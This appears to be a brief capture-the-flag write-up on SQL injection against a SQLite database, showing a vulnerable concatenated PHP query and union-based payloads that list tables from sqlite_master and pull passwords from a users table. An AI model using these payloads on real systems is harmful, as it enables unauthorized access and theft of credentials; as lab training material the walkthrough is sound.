### Error based sql injection in sqlite3

first thing i learn is always u don't need to give ' or 1=1  u have to close it only if it is query is  like

``` sql = 'SELECT * FROM Users WHERE Name ="' + uName + '" AND Pass ="' + uPass + '"' ```

our quey looks like this   ``` $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1'; ```


* Finding database tables: ( database() )

      1  union+select 1,name from sqlite_master -- '
 
* Finding   tables and columns names (table_name and col.. from information schema )

      1  union+select 1,sql from sqlite_master -- '
 
 and i found a column called password , let's find if any intresting there 
 
      1 AND 1=0 UNION ALL SELECT  1, password from users where id=1  -- '
 
 and we get the flag 
 
[Redacted]
